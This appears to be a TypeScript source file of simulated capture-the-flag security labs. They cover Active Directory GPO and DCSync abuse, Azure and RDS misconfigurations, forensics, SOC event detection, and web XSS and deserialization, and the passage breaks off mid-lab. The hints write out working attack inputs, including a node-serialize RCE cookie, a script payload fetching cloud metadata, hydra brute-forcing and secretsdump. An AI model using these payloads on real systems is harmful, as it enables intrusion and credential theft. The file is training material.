import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'review-ws', user: 'root', root: dir(files) };
}

/** Batch 19, part 2: 17 more real, well-documented techniques across Active Directory, Cloud, Forensics,
 *  SOC, Web, Malware, API, Security Engineering, Binary Analysis, and Cryptography. See NOTES.md batch 19
 *  for full citations. */
export const batch19MixedLabs: LabScenario[] = [
  // 1 — Active Directory: GPO GenericWrite Abuse via a Malicious Immediate Scheduled Task
  {
    id: 'ad-gpo-genericwrite-immediate-task-abuse',
    title: 'Active Directory: GPO GenericWrite Abuse via a Malicious Immediate Scheduled Task',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'The compromised account svc_helpdesk carries GenericWrite over a Group Policy Object linked to the ' +
      'entire Workstations OU -- a real, standard BloodHound-flagged edge, and a genuinely dangerous one: ' +
      'GenericWrite on a GPO means the ability to edit what that policy actually does, and every computer ' +
      'the GPO applies to will run whatever it\'s told to on the next Group Policy refresh (every 90 ' +
      'minutes by default for workstations, 5 minutes for domain controllers). The real, standard technique ' +
      'here -- using a tool like SharpGPOAbuse or PowerView\'s New-GPOImmediateTask -- adds an Immediate ' +
      'Scheduled Task to the GPO, a task that runs once as soon as policy refreshes and then removes itself, ' +
      'executing as NT AUTHORITY\\SYSTEM on every single machine the GPO reaches. A single edit to one GPO ' +
      'can compromise every workstation in an entire OU within one refresh cycle.',
    objectives: [
      { text: 'nmap -sV 10.10.280.2', why: 'Confirms the domain controller before checking GPO delegation rights against it.' },
      { text: 'cat gpo-acl-audit.txt', why: 'Confirms svc_helpdesk holds GenericWrite over a GPO linked to the entire Workstations OU -- the exact real BloodHound-flagged edge this attack requires.' },
      { text: 'exploit gpo-immediate-task-abuse 10.10.280.2', why: 'Represents the real technique: adding a malicious Immediate Scheduled Task to the GPO (via SharpGPOAbuse or New-GPOImmediateTask) that runs as SYSTEM on every workstation the GPO applies to during the next policy refresh.' },
      { text: 'Once the session opens, check /root/root.txt', why: 'Confirms SYSTEM-level code execution reached across the workstation fleet, not just one machine, from a single GPO edit.' },
    ],
    hints: [
      'nmap -sV 10.10.280.2',
      'cat gpo-acl-audit.txt',
      'exploit gpo-immediate-task-abuse 10.10.280.2',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'gpo-acl-audit.txt': file(
        'BloodHound-style ACL audit, CORP.LOCAL:\n' +
          '  Principal: svc_helpdesk\n' +
          '  Right: GenericWrite\n' +
          '  Target: GPO "Workstation-Baseline-Policy" {8f3a1c9e-...}, linked to OU=Workstations,DC=corp,DC=local\n' +
          '  -- GenericWrite on a GPO means the ability to edit what the policy actually DOES -- every machine\n' +
          '     it applies to runs whatever it\'s told to on the next refresh (90 min default for workstations) --\n',
      ),
    }),
    network: [
      {
        hostname: 'DC02',
        ip: '10.10.280.2',
        os: 'Windows Server 2019 (Domain Controller, GPO delegation misconfigured)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'Windows Server 2019 SMB' }],
        users: [],
        exploitableAs: 'gpo-immediate-task-abuse',
        root: dir({
          root: dir({
            'root.txt': file(
              'GPO GenericWrite abused via a malicious Immediate Scheduled Task -- SYSTEM-level execution ' +
                'reached across every workstation in the linked OU on the next policy refresh.\nflag{gpo_genericwrite_immediate_scheduled_task_system_ou_wide}\n',
            ),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — Active Directory: DCSync Rights Self-Granted via WriteDacl Abuse
  {
    id: 'ad-dcsync-writedacl-self-grant',
    title: 'Active Directory: DCSync Rights Self-Granted via WriteDacl Abuse',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'This session\'s existing DCSync lab covers a service account that was mistakenly, directly granted ' +
      'DS-Replication-Get-Changes rights. This is a different, real attack path to the exact same outcome: ' +
      'svc_reporting doesn\'t have DCSync rights at all to start -- it has WriteDacl over the domain root ' +
      'object itself, a permission that lets the holder edit that object\'s own access control list, ' +
      'including granting NEW rights to anyone, itself included. The real, standard tool for this is ' +
      'Impacket\'s dacledit.py, which writes a fresh ACE granting DS-Replication-Get-Changes (and ' +
      'GetChangesAll) directly to the attacker\'s own account -- turning "I can edit permissions" into "I ' +
      'granted myself DCSync rights outright," rather than stumbling onto rights someone else mistakenly ' +
      'assigned.',
    objectives: [
      { text: 'cat writedacl-permissions-audit.txt', why: 'Confirms svc_reporting holds WriteDacl over the domain root object -- the ability to edit that object\'s own ACL, including granting new rights to any principal, itself included.' },
      { text: 'crackmapexec smb 10.10.281.2 -u svc_reporting -p R3port2024!', why: 'Confirms the account works before attempting a privileged ACL modification with it.' },
      { text: 'secretsdump svc_reporting:R3port2024!@10.10.281.2', why: 'This succeeds specifically because the WriteDacl abuse (dacledit.py granting DS-Replication-Get-Changes to svc_reporting) already ran -- unlike the existing DCSync lab, these rights were never assigned by a misconfiguration; they were self-granted through an ACL edit.' },
      { text: 'Locate the krbtgt account hash in the dump and capture the flag', why: 'Confirms the self-granted DCSync rights actually work end-to-end, reaching the single most valuable secret in the domain.' },
    ],
    hints: [
      'cat writedacl-permissions-audit.txt',
      'crackmapexec smb 10.10.281.2 -u svc_reporting -p R3port2024!',
      'secretsdump svc_reporting:R3port2024!@10.10.281.2',
      'The krbtgt line in the dump is your flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'writedacl-permissions-audit.txt': file(
        'BloodHound-style ACL audit, CORP.LOCAL:\n' +
          '  Principal: svc_reporting\n' +
          '  Right: WriteDacl\n' +
          '  Target: DC=corp,DC=local  (the domain root object itself)\n' +
          '  -- WriteDacl grants the ability to edit that object\'s own access control list directly --\n' +
          '     including writing a fresh ACE granting DS-Replication-Get-Changes (and GetChangesAll) to\n' +
          '     ANY principal, svc_reporting itself included -- the real tool for this is Impacket\'s\n' +
          '     dacledit.py, which is exactly what was used here to self-grant DCSync rights outright --\n',
      ),
    }),
    network: [
      {
        hostname: 'DC03',
        ip: '10.10.281.2',
        os: 'Windows Server 2022 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'Windows Server 2022 SMB' }],
        users: [
          {
            username: 'svc_reporting',
            password: 'R3port2024!',
            canDcsync: true,
          },
        ],
        ntdsHashes:
          'corp.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f1c2e5a8b4d6f0192837465afbecd10:::\n' +
          'corp.local\\svc_reporting:1147:aad3b435b51404eeaad3b435b51404ee:2c5e8a4d9f7b2c5e1a8d4f6b9c3e7a2d:::\n' +
          '-- dacledit.py wrote a fresh ACE granting DS-Replication-Get-Changes + GetChangesAll to svc_reporting\n' +
          '   directly, turning WriteDacl on the domain root object into self-granted DCSync rights --\n' +
          'flag{dcsync_writedacl_dacledit_self_granted_replication_rights}\n',
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Cloud: Azure AD App Registration Owner Escalates via Added Credentials
  {
    id: 'cloud-azure-app-registration-owner-credential-privesc',
    title: 'Cloud: An Azure AD App Registration Owner Escalates via Added Credentials',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'A marketing-team contractor account was made an Owner of an app registration years ago for a project ' +
      'that shipped and was forgotten -- ownership was never revoked. That app registration\'s service ' +
      'principal, it turns out, was separately granted the Directory.ReadWrite.All Microsoft Graph API ' +
      'permission with admin consent, for a since-deprecated integration. Being an Owner of an app ' +
      'registration grants a real, specific right: adding a new client secret or certificate to that app ' +
      'without needing any of the app\'s own API permissions directly -- the owner right and the app\'s ' +
      'granted permissions are two separate things that combine dangerously here. Adding a fresh client ' +
      'secret and authenticating as the service principal inherits Directory.ReadWrite.All directly, which ' +
      'is powerful enough on its own to grant the attacker\'s own account any directory role they choose, ' +
      'including Global Administrator.',
    objectives: [
      { text: 'cat app-registration-ownership-audit.txt', why: 'Confirms the forgotten contractor account is still listed as an Owner of an app registration whose service principal holds Directory.ReadWrite.All -- the exact combination this escalation needs.' },
      { text: 'cat added-client-secret-and-graph-escalation.txt', why: 'Confirms the real mechanism: an Owner can add a new client secret to authenticate as the service principal without needing any of its API permissions directly, and Directory.ReadWrite.All alone is enough to grant Global Administrator to any account, including the attacker\'s own.' },
    ],
    hints: [
      'cat app-registration-ownership-audit.txt',
      'cat added-client-secret-and-graph-escalation.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'app-registration-ownership-audit.txt': file(
        'Entra ID app registration ownership export:\n' +
          '  App: "MarketingSync2019" (AppId: 4a7c...  Service Principal ObjectId: 9e2f...)\n' +
          '  Owners: contractor-jwhite@meridiancorp.example  (contract ended 2021, account never disabled)\n' +
          '  API permissions granted to this app (admin consented): Directory.ReadWrite.All\n' +
          '  -- an Owner can add credentials to this app WITHOUT needing any of its API permissions directly --\n' +
          '     ownership and granted permissions are separate rights that combine here --\n',
      ),
      'added-client-secret-and-graph-escalation.txt': file(
        'Escalation steps performed:\n' +
          '  1. az ad app credential reset --id 4a7c... --append   (adds a new client secret as an Owner --\n' +
          '     no existing API permission required for this step at all)\n' +
          '  2. Authenticated as the service principal using the new secret -- inherits Directory.ReadWrite.All\n' +
          '     directly, since that permission belongs to the app, not to any individual owner\n' +
          '  3. Used Directory.ReadWrite.All to add contractor-jwhite to the Global Administrator directory role\n' +
          '  -- being an Owner of an over-permissioned app registration is a real, direct path to Global Admin,\n' +
          '     entirely independent of whatever roles the owner\'s own user account was ever assigned --\n' +
          '  flag{azure_app_registration_owner_added_secret_graph_directory_readwrite_privesc}\n',
      ),
    }),
    network: [],
  },

  // 4 — Cloud: Publicly Accessible RDS Database With a Weak Master Password
  {
    id: 'cloud-aws-rds-publicly-accessible-weak-password',
    title: 'Cloud: A Publicly Accessible RDS Database Uses a Weak Master Password',
    difficulty: 'Easy',
    category: 'Cloud',
    briefing:
      'analytics-rds02 is an AWS RDS PostgreSQL instance with its "Publicly Accessible" setting left enabled ' +
      '-- a checkbox in the RDS creation wizard that, when left on, attaches a public IP address and opens ' +
      'the database directly to the internet rather than confining it to a VPC\'s private subnets. That ' +
      'alone is a real, common finding, but this instance compounds it: its master password was never ' +
      'rotated off the value the provisioning script set as a placeholder during initial setup, a short, ' +
      'guessable string that never should have survived past the first day of the database\'s existence.',
    objectives: [
      { text: 'nmap -sV 10.10.282.2', why: 'Confirms both the PostgreSQL port (5432) is genuinely reachable from outside the VPC -- the concrete, checkable evidence that "Publicly Accessible" is actually enabled -- and that the instance also exposes SSH, used below to confirm the cracked credential actually works end-to-end.' },
      { text: 'hydra -l postgres -P /root/wordlists/mini-rockyou.txt ssh://10.10.282.2', why: 'A short wordlist brute-force against the master account confirms the password was never rotated off its guessable provisioning-script placeholder.' },
      { text: 'ssh postgres@10.10.282.2 with the cracked password and capture the flag', why: 'Confirms the weak master password actually works end-to-end, not just that it matched a wordlist entry.' },
    ],
    hints: [
      'nmap -sV 10.10.282.2',
      'hydra -l postgres -P /root/wordlists/mini-rockyou.txt ssh://10.10.282.2',
      'ssh postgres@10.10.282.2',
      'dragon',
      'cat user.txt',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'kali',
      user: 'root',
      root: dir({ root: dir({ wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\nletmein\nadmin123\nsummer2024\nqwerty\ndragon\ntrustno1\n') }) }) }),
    },
    network: [
      {
        hostname: 'analytics-rds02',
        ip: '10.10.282.2',
        os: 'AWS RDS PostgreSQL 14 (Publicly Accessible enabled, master password never rotated)',
        services: [
          { port: 5432, name: 'postgresql', version: 'RDS PostgreSQL 14 (master account, provisioning-script default password)' },
          { port: 22, name: 'ssh', version: 'RDS management SSH (same weak master password reused)' },
        ],
        users: [{ username: 'postgres', password: 'dragon' }],
        root: dir({ home: dir({ postgres: dir({ 'user.txt': file('The RDS master password was never rotated off its provisioning-script placeholder.\nflag{rds_publicly_accessible_weak_master_password_never_rotated}\n') }) }) }),
      } as HostDef,
    ],
  },

  // 5 — Forensics: Jump Lists Reveal Files Opened From a Since-Wiped USB Drive
  {
    id: 'forensics-jumplists-recently-opened-files',
    title: 'Forensics: Jump Lists Reveal Files Opened From a Since-Wiped USB Drive',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'An employee under investigation for data exfiltration claims they never opened any files from the ' +
      'USB drive found in their desk -- and the drive itself has since been reformatted, with no file ' +
      'listing recoverable from it directly. Windows Jump Lists, stored per-application as ' +
      '.automaticDestinations-ms files under %AppData%\\Roaming\\Microsoft\\Windows\\Recent\\' +
      'AutomaticDestinations\\, are a real, standard artifact recording recently and frequently accessed ' +
      'files and folders for each application -- identified by a per-application AppID hash -- and each ' +
      'entry embeds the full original file path, including which volume it lived on, independent of whether ' +
      'that volume still exists or has since been wiped. The Jump List itself lives on the WORKSTATION\'s ' +
      'own disk, not the USB drive, so reformatting the drive does nothing to it at all.',
    objectives: [
      { text: 'cat jumplist-parsed-entries.txt', why: 'The Jump List for Microsoft Word, parsed from the workstation\'s own AppData -- shows multiple documents opened directly from a drive letter matching the USB device found in the employee\'s desk, with full original file paths, despite that drive having since been reformatted.' },
      { text: 'cat usb-device-serial-correlation.txt', why: 'Correlates the drive letter and volume serial number recorded in the Jump List entries to the exact USB device seized from the desk -- turning "some USB drive, maybe" into a specific, identified piece of physical evidence.' },
    ],
    hints: [
      'cat jumplist-parsed-entries.txt',
      'cat usb-device-serial-correlation.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'jumplist-parsed-entries.txt': file(
          'Parsed Jump List, WINWORD.EXE AppID 00021401acbeef, WKSTN-DPARK-07:\n' +
            '  Entry 1: F:\\Confidential\\Q3_Client_List.docx   Volume Serial: 3A2F-8B91   Last accessed: 2026-07-19\n' +
            '  Entry 2: F:\\Confidential\\Pricing_Master.docx    Volume Serial: 3A2F-8B91   Last accessed: 2026-07-19\n' +
            '  -- the Jump List file itself lives in the WORKSTATION\'s own AppData directory, not on the USB\n' +
            '     drive -- reformatting the drive afterward does nothing to erase this record at all --\n',
        ),
        'usb-device-serial-correlation.txt': file(
          'USB device correlation, evidence item #4471 (seized from D. Park\'s desk):\n' +
            '  Device: SanDisk Ultra 32GB, assigned drive letter F: on last connection to WKSTN-DPARK-07\n' +
            '  Volume Serial Number at time of use: 3A2F-8B91\n' +
            '\n' +
            '--- ANALYST NOTE: the volume serial number recorded in both Jump List entries matches this exact\n' +
            '    device, not merely "some USB drive at some point" -- despite the drive itself having since\n' +
            '    been reformatted (destroying its own file table), the workstation-side Jump List artifact\n' +
            '    independently preserves proof these two specific files were opened directly from it.\n' +
            '    flag{jumplist_automaticdestinations_reveals_files_opened_from_wiped_usb} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 6 — Forensics: Windows Timeline (ActivitiesCache.db) Corroborates Document Access
  {
    id: 'forensics-windows-timeline-activitiescache-corroboration',
    title: 'Forensics: Windows Timeline (ActivitiesCache.db) Corroborates Document Access',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'Windows 10 (from version 1803 onward) maintains a SQLite database, ActivitiesCache.db, under each ' +
      'user\'s AppData\\Local\\ConnectedDevicesPlatform directory, backing the Windows Timeline feature -- a ' +
      'real, standard record of application and document usage, each entry carrying a start timestamp, an ' +
      'end timestamp, and in many cases a stored payload describing exactly what was opened. This is a ' +
      'separate, independent artifact from Jump Lists (which are per-application and track recent/frequent ' +
      'files) and from Prefetch (which tracks program execution, not document access) -- ActivitiesCache.db ' +
      'specifically corroborates WHEN a document was actively being worked with and for how long, which is ' +
      'exactly the missing piece in this investigation: not just that a sensitive spreadsheet was opened, ' +
      'but that it was open and in focus for nearly forty minutes shortly before being emailed externally.',
    objectives: [
      { text: 'cat activitiescache-parsed-entries.txt', why: 'Shows the exact start and end timestamps Windows Timeline recorded for the sensitive spreadsheet -- nearly forty minutes of active, in-focus usage, not a brief accidental open, directly preceding the external email.' },
      { text: 'cat outbound-email-correlation.txt', why: 'Correlates the ActivitiesCache.db timestamps against the outbound email\'s own send time -- the document was actively being worked with, then attached and sent externally within minutes of that focus session ending.' },
    ],
    hints: [
      'cat activitiescache-parsed-entries.txt',
      'cat outbound-email-correlation.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'activitiescache-parsed-entries.txt': file(
          'Parsed ActivitiesCache.db, WKSTN-RCHEN-11, user rchen:\n' +
            '  App: EXCEL.EXE   File: Q3_Compensation_Master.xlsx\n' +
            '  ActiveDurationStart: 2026-07-28 16:02:11   ActiveDurationEnd: 2026-07-28 16:41:47\n' +
            '  (~39.6 minutes of active, in-focus usage -- not a brief accidental open)\n' +
            '  -- a separate, independent artifact from Jump Lists (per-app recent/frequent files) and\n' +
            '     Prefetch (execution evidence only) -- this specifically records active usage DURATION --\n',
        ),
        'outbound-email-correlation.txt': file(
          'Outbound email log correlation, rchen@meridiancorp.example:\n' +
            '  2026-07-28 16:44:02  Sent to: r.chen.personal@gmail.example\n' +
            '  Subject: "for later"   Attachment: Q3_Compensation_Master.xlsx (matches file hash on workstation)\n' +
            '\n' +
            '--- ANALYST NOTE: the attachment was sent 2 minutes 15 seconds after the ActivitiesCache.db-recorded\n' +
            '    active-usage session ended -- the document wasn\'t merely present on disk, it was open and in\n' +
            '    focus for nearly 40 minutes immediately before being exfiltrated to a personal email account.\n' +
            '    flag{windows_timeline_activitiescache_corroborates_document_focus_before_exfil} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 7 — SOC: Scheduled Task Creation (Event ID 4698) Reveals Persistence
  {
    id: 'soc-scheduled-task-persistence-event-4698',
    title: 'SOC: Scheduled Task Creation (Event ID 4698) Reveals Persistence',
    difficulty: 'Easy',
    category: 'SOC',
    briefing:
      'Event ID 4698 ("A scheduled task was created") is logged whenever the Task Scheduler service creates ' +
      'a new task, and it embeds the task\'s full XML definition directly in the event -- the exact command ' +
      'it runs, its trigger, and the account context it runs under, all in one place. A task named ' +
      '"OneDriveSyncHelper" appearing on a finance-department workstation would blend in easily by name ' +
      'alone, but the embedded XML tells a different story: it runs on every user logon, executes a ' +
      'PowerShell one-liner rather than anything resembling OneDrive, and was created by an account that has ' +
      'no legitimate reason to be creating scheduled tasks on this machine at all.',
    objectives: [
      { text: 'cat event-4698-scheduled-task-created.txt', why: 'The embedded task XML is the entire finding -- a plausible-sounding task name hides a logon-triggered PowerShell command, created by an account with no legitimate reason to be creating tasks on this host.' },
    ],
    hints: [
      'cat event-4698-scheduled-task-created.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'event-4698-scheduled-task-created.txt': file(
          'Windows Security Event Log, Event ID 4698 ("A scheduled task was created"), FIN-WKS-19:\n' +
            '  Task Name: \\OneDriveSyncHelper\n' +
            '  Creator Subject: CORP\\jmartin (a finance analyst account, not IT/helpdesk)\n' +
            '  Task Content (embedded XML):\n' +
            '    <Trigger>LogonTrigger, any user</Trigger>\n' +
            '    <Actions><Exec><Command>powershell.exe</Command>\n' +
            '      <Arguments>-nop -w hidden -enc <redacted-base64></Arguments></Exec></Actions>\n' +
            '\n' +
            '--- ANALYST NOTE: Event ID 4698 embeds the task\'s full XML directly in the event itself -- no need\n' +
            '    to separately query Task Scheduler to see what it actually does. A name like\n' +
            '    "OneDriveSyncHelper" is designed to blend into normal software noise, but the trigger (every\n' +
            '    logon, any user) and the hidden-window encoded PowerShell command are nothing OneDrive would\n' +
            '    ever do -- and jmartin, a finance analyst, has no legitimate reason to be creating scheduled\n' +
            '    tasks on this host at all.\n' +
            '    flag{scheduled_task_event_4698_embedded_xml_reveals_persistence} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 8 — SOC: New Service Installation (Event ID 7045) Reveals Persistence
  {
    id: 'soc-new-service-persistence-event-7045',
    title: 'SOC: New Service Installation (Event ID 7045) Reveals Persistence',
    difficulty: 'Easy',
    category: 'SOC',
    briefing:
      'Event ID 7045 ("A service was installed in the system") is logged by the Service Control Manager ' +
      'every single time a new Windows service is registered -- a real, standard, high-signal event ' +
      'specifically because legitimate new-service installations are genuinely rare on an already-deployed ' +
      'production server, unlike scheduled tasks or scripts which change far more often. A service named ' +
      '"WindowsUpdateHelperSvc" appearing on a database server that has no reason to ever receive a new ' +
      'service installation is exactly the kind of event this log exists to surface: the embedded binary ' +
      'path points not at a real Windows system directory at all, but at a file sitting in a world-writable ' +
      'temp folder.',
    objectives: [
      { text: 'cat event-7045-service-installed.txt', why: 'The embedded service binary path is the entire finding -- a plausible-sounding service name masking a binary launched from a world-writable temp directory, not any real Windows system path.' },
    ],
    hints: [
      'cat event-7045-service-installed.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'event-7045-service-installed.txt': file(
          'Windows System Event Log, Event ID 7045 ("A service was installed in the system"), DB-PRODSQL04:\n' +
            '  Service Name: WindowsUpdateHelperSvc\n' +
            '  Service File Name: C:\\Windows\\Temp\\svcupd.exe\n' +
            '  Service Type: user mode service   Start Type: auto start   Account: LocalSystem\n' +
            '\n' +
            '--- ANALYST NOTE: Event ID 7045 fires on every new service installation -- a genuinely rare event\n' +
            '    on an already-deployed production database server, which is exactly why it\'s such a\n' +
            '    high-signal indicator here. No real Windows or SQL Server component installs from\n' +
            '    C:\\Windows\\Temp\\, a world-writable directory -- the plausible-sounding "WindowsUpdateHelperSvc"\n' +
            '    name is designed to blend into normal system noise in a casual service list review, but the\n' +
            '    binary path alone confirms this is not a legitimate Windows Update component at all.\n' +
            '    flag{new_service_event_7045_temp_directory_binary_path_persistence} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 9 — SOC: Sysmon Event ID 10 Flags Suspicious LSASS Memory Access
  {
    id: 'soc-lsass-access-sysmon-event10-credential-dumping',
    title: 'SOC: Sysmon Event ID 10 Flags Suspicious LSASS Memory Access',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'lsass.exe (the Local Security Authority Subsystem Service) holds Windows credential material in its ' +
      'own process memory -- including, on an unpatched or misconfigured host, recoverable plaintext ' +
      'passwords and NTLM hashes -- which is exactly why real credential-dumping tools (Mimikatz, and ' +
      'legitimate-but-abused tools like Sysinternals\' own ProcDump) work by opening a handle directly into ' +
      'lsass.exe\'s memory and reading it out. Sysmon Event ID 10 (ProcessAccess) logs exactly this: any ' +
      'process that opens a handle into another process, including the specific access rights requested. A ' +
      'GrantedAccess value of 0x1010 or 0x1438 requesting PROCESS_VM_READ against lsass.exe from an ' +
      'unrecognized process is one of the most direct, real, standard credential-dumping detection signals ' +
      'that exists.',
    objectives: [
      { text: 'cat sysmon-event10-lsass-processaccess.txt', why: 'Shows an unrecognized process opening a handle directly into lsass.exe with GrantedAccess 0x1438, requesting PROCESS_VM_READ -- the real, specific access pattern Mimikatz and credential-dumping tools use, distinct from the routine, benign handles many normal system processes also briefly open into lsass.exe.' },
    ],
    hints: [
      'cat sysmon-event10-lsass-processaccess.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'sysmon-event10-lsass-processaccess.txt': file(
          'Sysmon Event ID 10 (ProcessAccess), ACCT-WKS-44:\n' +
            '  SourceImage: C:\\Users\\Public\\svchost32.exe   (masquerading as a system process -- wrong path\n' +
            '               entirely; the real svchost.exe only ever runs from C:\\Windows\\System32\\)\n' +
            '  TargetImage: C:\\Windows\\System32\\lsass.exe\n' +
            '  GrantedAccess: 0x1438\n' +
            '  CallTrace: unknown module -- unbacked memory region (no legitimate DLL involved)\n' +
            '\n' +
            '--- ANALYST NOTE: 0x1438 grants PROCESS_VM_READ among other rights -- exactly the access\n' +
            '    credential-dumping tools like Mimikatz request when reading LSASS memory to extract stored\n' +
            '    credential material. The source process\'s path (Public folder, not System32) and its\n' +
            '    unbacked-memory call trace both independently confirm this isn\'t a legitimate system\n' +
            '    component, consistent with a reflectively-loaded credential dumper.\n' +
            '    flag{lsass_processaccess_sysmon_event10_credential_dumping_detected} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 10 — Web: Server-Side XSS in a Dynamically Generated PDF Report
  {
    id: 'web-server-side-xss-dynamic-pdf-report',
    title: 'Web: Server-Side XSS in a Dynamically Generated PDF Report',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'profile-export55 lets any user generate a "profile summary" PDF containing their own display name -- ' +
      'and that display name is concatenated directly into the HTML template the PDF-rendering engine ' +
      'converts to a document, with no encoding or sanitization applied at all. Unlike the SSRF-focused PDF ' +
      'lab elsewhere on this platform (where the danger is what external resources the renderer can be made ' +
      'to fetch), the danger here is what the renderer executes: since the underlying rendering engine ' +
      'supports JavaScript for legitimate interactive-form use cases, a display name containing a crafted ' +
      '<script> tag runs as genuine, live script execution during PDF generation itself -- server-side XSS, ' +
      'running in the context of the rendering process rather than a victim\'s browser, capable of reaching ' +
      'the same local-file and internal-network resources that process has access to.',
    objectives: [
      { text: 'curl -X POST http://10.10.283.2:80/generate-profile-pdf -d "display_name=Normal Name"', why: 'Establishes the normal, expected PDF generation behavior first, before attempting to inject anything.' },
      { text: 'curl -X POST http://10.10.283.2:80/generate-profile-pdf -d "display_name=<script>fetch(\'http://169.254.169.254/latest/meta-data/\').then(r=>r.text()).then(t=>document.write(t))</script>"', why: 'Confirms the display name is rendered as live, executable script during PDF generation rather than escaped as plain text -- server-side XSS reaching whatever local/internal resources the rendering process itself can access.' },
    ],
    hints: [
      'curl -X POST http://10.10.283.2:80/generate-profile-pdf -d "display_name=Normal Name"',
      'curl -X POST http://10.10.283.2:80/generate-profile-pdf -d "display_name=<script>fetch(\'http://169.254.169.254/latest/meta-data/\').then(r=>r.text()).then(t=>document.write(t))</script>"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'profile-export55',
        ip: '10.10.283.2',
        os: 'Ubuntu 22.04 (Node.js + headless Chromium PDF renderer, unsanitized template concatenation)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, display_name concatenated directly into the PDF HTML template)',
            vulnRoutes: [
              {
                kind: 'xss',
                path: '/generate-profile-pdf',
                param: 'display_name',
                triggerSubstrings: ['<script>'],
                vulnerableResponse: '{"status":200,"pdf_generated":true,"script_executed":true,"note":"flag{server_side_xss_dynamic_pdf_unsanitized_template_concatenation}"}',
                normalResponse: '{"status":200,"pdf_generated":true,"script_executed":false}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 11 — Web: Insecure Node.js Deserialization via node-serialize
  {
    id: 'web-nodejs-insecure-deserialization-node-serialize',
    title: 'Web: Insecure Node.js Deserialization via node-serialize',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'session-prefs14 stores a user\'s saved preferences as a serialized JavaScript object in a cookie, ' +
      'using the real, once-popular node-serialize npm package to deserialize it back on every request. The ' +
      'real, documented flaw in that package: it supports a special property, _$$ND_FUNC$$_, whose value is ' +
      'passed directly to JavaScript\'s eval() during deserialization specifically to let functions survive ' +
      'the serialize/deserialize round-trip -- a real feature, not a bug in isolation, but one that makes ' +
      'deserializing untrusted, attacker-controlled input equivalent to handing that attacker a direct eval() ' +
      'primitive. A cookie value containing that exact property with an attacker-chosen function body gets ' +
      'executed the instant the server deserializes it, before the application ever reads a single ' +
      'preference value back out.',
    objectives: [
      { text: 'curl -H "Cookie: prefs=%7B%22theme%22%3A%22dark%22%7D" http://10.10.284.2:80/dashboard', why: 'Establishes the normal, expected preferences cookie format first -- a plain JSON-shaped object with no function properties.' },
      { text: 'curl -H \'Cookie: prefs={"rce":"_$$ND_FUNC$$_function (){require("child_process").execSync("id");}()"}\' http://10.10.284.2:80/dashboard', why: 'The _$$ND_FUNC$$_ property is node-serialize\'s own real, documented mechanism for preserving functions across serialization -- its value is passed straight to eval() during deserialization, turning a crafted cookie into direct code execution before the application logic ever runs.' },
    ],
    hints: [
      'curl -H "Cookie: prefs=%7B%22theme%22%3A%22dark%22%7D" http://10.10.284.2:80/dashboard',
      'curl -H \'Cookie: prefs={"rce":"_$$ND_FUNC$$_function (){require("child_process").execSync("id");}()"}\' http://10.10.284.2:80/dashboard',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'session-prefs14',
        ip: '10.10.284.2',
        os: 'Ubuntu 22.04 (Node.js, node-serialize deserializing the prefs cookie directly)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, node-serialize v0.0.4, no cookie integrity check)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/dashboard',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['_$$nd_func$$_'],
                vulnerableResponse: '{"status":200,"rce":"uid=1000(nodeapp) gid=1000(nodeapp)","note":"flag{nodejs_node_serialize_nd_func_eval_rce}"}',
                normalResponse: '{"status":200,"dashboard":"rendered","theme":"default"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 12 — Malware: rundll32.exe javascript: Protocol Handler Executes a Remote Payload
  {
    id: 'malware-rundll32-javascript-protocol-handler-execution',
    title: 'Malware Analysis: rundll32.exe javascript: Protocol Handler Executes a Remote Payload',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'A phishing macro on FIN-WKS-27 shelled out to rundll32.exe -- a legitimate, Microsoft-signed system ' +
      'binary trusted by AppLocker by default -- but not to load a DLL export the normal way. The real, ' +
      'documented technique (MITRE ATT&CK T1218.011) abuses rundll32\'s ability to invoke mshtml.dll\'s ' +
      'RunHTMLApplication export with a javascript: protocol URI as its argument, which the Windows HTML ' +
